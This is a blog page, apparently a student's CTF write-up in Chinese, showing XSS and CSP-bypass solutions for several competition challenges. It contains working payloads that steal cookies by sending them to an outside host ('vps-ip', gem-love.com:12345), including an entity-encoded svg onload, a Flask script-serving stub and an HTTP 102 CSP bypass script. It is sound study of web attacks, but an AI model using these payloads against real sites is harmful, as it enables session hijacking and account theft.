@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><meta name="generator" content="Hexo 3.9.0">
+    
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="description" content="XSS&bypass CSP">
+
+
+
+
+  <meta name="keywords" content="xss,">
+
+
+
+
+
+  <link rel="alternate" href="/default" title="glotozz'blog">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1">
+
+
+
+<link rel="canonical" href="https://glotozz.github.io/2020/02/27/XSS-bypass-CSP/">
+
+
+<meta name="description" content="从几道题学习XSS以及一些相关绕过姿势">
+<meta name="keywords" content="xss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS&amp;bypass CSP">
+<meta property="og:url" content="https://glotozz.github.io/2020/02/27/XSS-bypass-CSP/index.html">
+<meta property="og:site_name" content="glotozz&#39;blog">
+<meta property="og:description" content="从几道题学习XSS以及一些相关绕过姿势">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-27_12-56-43.png">
+<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-27_14-19-15.png">
+<meta property="og:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-27_14-31-55.png">
+<meta property="og:updated_time" content="2020-02-27T07:49:23.503Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS&amp;bypass CSP">
+<meta name="twitter:description" content="从几道题学习XSS以及一些相关绕过姿势">
+<meta name="twitter:image" content="c:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-27_12-56-43.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1">
+<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> XSS&bypass CSP - glotozz'blog </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">glotozz'blog</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/read">
+                            
+                            
+                                Read
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          XSS&bypass CSP
+        
+      </h1>
+
+      <time class="post-time">
+          Feb 27 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <p>从几道题学习XSS以及一些相关绕过姿势</p>
+<meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<h4 id="hgame-Cosmos的聊天室1"><a href="#hgame-Cosmos的聊天室1" class="headerlink" title="hgame-Cosmos的聊天室1"></a>hgame-Cosmos的聊天室1</h4><p>环境关了，yy一下好了==！</p>
+<p>过滤了所有闭合标签script、iframe等：<code>re.sub(&quot;&lt;\/?[^&gt;]+&gt;&quot;, &quot;&quot;, message)</code>,并转化为大写</p>
+<p>用浏览器事件执行js，不闭合右标签时会自动补全</p>
+<p>payload1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104</span><br><span class="line">&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#118&amp;#112&amp;#115&amp;#45&amp;#105&amp;#112&amp;#39&amp;#43&amp;#100&amp;#111&amp;#99&amp;</span><br><span class="line">#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#41&amp;#59&amp;#47&amp;#47</span><br></pre></td></tr></table></figure>
+
+<p>编码内容<code>window.open(&#39;http://vps-ip&#39;+document.cookie);//</code></p>
+<p>payload2</p>
+<p>引入外部页面</p>
+<p><strong>这个做法仅限chrome</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"import"</span><span class="attr">href</span>=<span class="string">"http://vps-ip/"</span></span></span><br></pre></td></tr></table></figure>
+
+<p>但是需要解决跨域问题，使用flask或者SimpleHTTPServer开个服务即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">	response = make_response(<span class="string">"&lt;script&gt;window.open('http://vps-ip/'+document.cookie)&lt;/script&gt;"</span>)</span><br><span class="line">	response.headers[<span class="string">'Access-Control-Allow-Origin'</span>] = <span class="string">'*'</span></span><br><span class="line">	<span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	app.run(host=<span class="string">"0.0.0.0"</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<p>本地测试</p>
+<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-27_12-56-43.png" alt="Snipaste_2020-02-27_12-56-43"></p>
+<hr>
+<h4 id="hgame-Comcos聊天室2"><a href="#hgame-Comcos聊天室2" class="headerlink" title="hgame-Comcos聊天室2"></a>hgame-Comcos聊天室2</h4><p>将<code>script</code>替换为空，双写绕过，但是出现报错</p>
+<blockquote>
+<p>Refused to execute inline script because it violates the following Content<br>Security Policy directive: “script-src ‘self’”. Either the ‘unsafe-inline’<br>keyword, a hash (‘sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=’), or a<br>nonce (‘nonce-…’) is required to enable inline execution.</p>
+</blockquote>
+<p>查看CSP策略</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>它限制了内联 JS 脚本，并且限制了引入的静态资源文件只能从同域下加载。在实际应用中，遇到这种<br>CSP ⼀般是找该站是否有文件上传点，上传⼀个内容为 <code>alert(/xss/)</code> 的图⽚再引用，也可以同源下有没有可以执行任意 JS 代码的 evil.js 文件。</p>
+</blockquote>
+<p>本题中有⼀个接口 <code>/send</code>，它会返回过滤后的消息内容，我们可以利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scriscriptpt src=&quot;/send?message=alert(1)&quot;&gt;&lt;/scscriptript&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="RealWorld-CTF2019-Mission-Invisible"><a href="#RealWorld-CTF2019-Mission-Invisible" class="headerlink" title="RealWorld CTF2019-Mission Invisible"></a>RealWorld CTF2019-Mission Invisible</h4><p>给了源码，核心是</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    function setElement(tag) &#123;</span><br><span class="line">        tag = tag.substring(0, 1);</span><br><span class="line">        var ele = document.createElement(tag)</span><br><span class="line">        var attrs = getCookie("attrs").split("&amp;");</span><br><span class="line">        for (var i = 0; i &lt; attrs.length; i++) &#123;</span><br><span class="line">            var key = attrs[i].split("=")[0];</span><br><span class="line">            var value = attrs[i].split("=")[1];</span><br><span class="line">            ele.setAttribute(key, value);</span><br><span class="line">        &#125;</span><br><span class="line">        document.body.appendChild(ele);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var tag = getUrlParam("tag");</span><br><span class="line">    setCookie("tag", tag);</span><br><span class="line">    setElement(tag);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以构造一个标签并为其设置属性</p>
+<p>只能使用<code>a、p</code>，但是需要使其自动触发，解决办法如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>chrome测试成功</p>
+<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-27_14-19-15.png" alt="Snipaste_2020-02-27_14-19-15"></p>
+<p>之后常规打cookie即可</p>
+<hr>
+<h4 id="RealWorld-CTF2019-Hcorme"><a href="#RealWorld-CTF2019-Hcorme" class="headerlink" title="RealWorld CTF2019-Hcorme"></a>RealWorld CTF2019-Hcorme</h4><blockquote>
+<p>题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。 </p>
+</blockquote>
+<p>两个限制：<code>XSS Auditor</code>、<code>Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></p>
+<p>Hardold师傅的思路—&gt;<strong>utf-16编码绕过</strong> </p>
+<blockquote>
+<p>因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。 </p>
+</blockquote>
+<p><img src="C:%5CUsers%5Cgqy%5CDesktop%5CSnipaste_2020-02-27_14-31-55.png" alt="Snipaste_2020-02-27_14-31-55"></p>
+<p>猜测是类似截断的原理，从而bypass XSS Auditor</p>
+<blockquote>
+<p>绕过CSP，是利用JSONP直接把js代码挂载到本地的<code>script</code></p>
+<p>会进行两次资源请求，第二次的资源类型是<code>script</code></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(quote((&apos;&lt;script/src=?callback=alert(1)&gt;&lt;/script&gt;&apos;).encode(&apos;utf-16&apos;)))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="CODEGATE-2020-CSP绕过"><a href="#CODEGATE-2020-CSP绕过" class="headerlink" title="CODEGATE 2020 CSP绕过"></a>CODEGATE 2020 CSP绕过</h4><p>前面是一个简单的正则绕过，发现存在CSP</p>
+<p><code>script-src &#39;none&#39;</code></p>
+<p><code>view.php</code>提交到<code>api.php</code>，格式为name/p1/p2，可以设置<strong>header</strong></p>
+<p>解决办法：*<em>http状态码置为102时，CSP不会执行 *</em></p>
+<p>颖奇师傅的payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author: 颖奇L'Amore</span></span><br><span class="line"><span class="comment">#www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">csp1 = str(base64.b64encode(<span class="string">b'header'</span>) ,encoding = <span class="string">"utf8"</span>)</span><br><span class="line">csp2 = str(base64.b64encode(<span class="string">b'HTTP/1.1'</span>),encoding = <span class="string">"utf8"</span>)</span><br><span class="line">csp3 = str(base64.b64encode(<span class="string">b'102'</span>),encoding = <span class="string">"utf8"</span>)</span><br><span class="line">name = str(base64.b64encode(<span class="string">b'body'</span>),encoding = <span class="string">"utf8"</span>)</span><br><span class="line">xss = str(base64.b64encode(<span class="string">b'&lt;script\n&gt;window.open("http://gem-love.com:12345/?"+document.cookie);&lt;/script\n&gt;'</span>),encoding = <span class="string">"utf8"</span>)</span><br><span class="line">p3 = <span class="string">"MQ=="</span> <span class="comment">#p3 is useless</span></span><br><span class="line">print(<span class="string">'|&#123;&#125;,&#123;&#125;,&#123;&#125;|&#123;&#125;,&#123;&#125;,&#123;&#125;'</span>.format(csp1,csp2,csp3,name,xss,p3))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h4 id="0ctf2018-h4xors-club2"><a href="#0ctf2018-h4xors-club2" class="headerlink" title="0ctf2018-h4xors.club2"></a>0ctf2018-h4xors.club2</h4><p>发现看不懂==！以后再来补</p>
+<hr>
+<p>最后给个分享个链接，遇到问题可以查一查：<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">CSP策略及绕过方法</a></p>
+<hr>
+<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p> <a href="https://www.anquanke.com/post/id/186707" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186707</a> </p>
+<p> <a href="https://github.com/vidar-team/Hgame2020_writeup/" target="_blank" rel="noopener">https://github.com/vidar-team/Hgame2020_writeup/</a> </p>
+<p> <a href="https://www.gem-love.com/ctf/1329.html#CSP" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1329.html#CSP</a> </p>
+<p> <a href="http://www.wupco.cn/?p=4408" target="_blank" rel="noopener">http://www.wupco.cn/?p=4408</a> </p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+
+        
+         <div>    
+          
+          <ul class="post-copyright">
+             <li class="post-copyright-link">
+              <strong>本文作者：</strong>
+              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
+            </li>
+
+            <li class="post-copyright-license">
+              <strong>版权声明： </strong>
+               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
+            </li>
+          </ul>
+        
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
+          
+        </div>
+      
+
+        
+        
+  <nav class="post-nav">
+    
+    
+      <a class="next" href="/2020/02/26/从一道题学习bypass-disable-func/">
+        <span class="next-text nav-default">从一道题学习bypass disable_func</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+      <div id="vcomments"></div>
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+    2020
+    <span class="footer-author">glotozz.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+
+  
+<!-- valine Comments -->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
+<script type="text/javascript">
+    new Valine({
+        el: '#vcomments',
+        notify: false,
+        verify: false,
+        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
+        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
+        placeholder: "Just go go",
+        avatar: 'mm'
+    });
+</script>
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
